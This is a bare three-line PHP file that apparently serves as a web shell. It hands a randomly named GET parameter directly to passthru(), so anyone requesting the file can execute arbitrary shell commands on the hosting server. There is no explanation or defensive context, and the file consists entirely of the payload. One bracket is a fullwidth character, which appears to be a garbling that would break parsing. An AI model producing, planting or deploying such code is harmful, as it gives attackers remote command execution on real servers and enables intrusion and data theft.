<?php
passthru($_GET['DzjxTvoo'〕);
?>
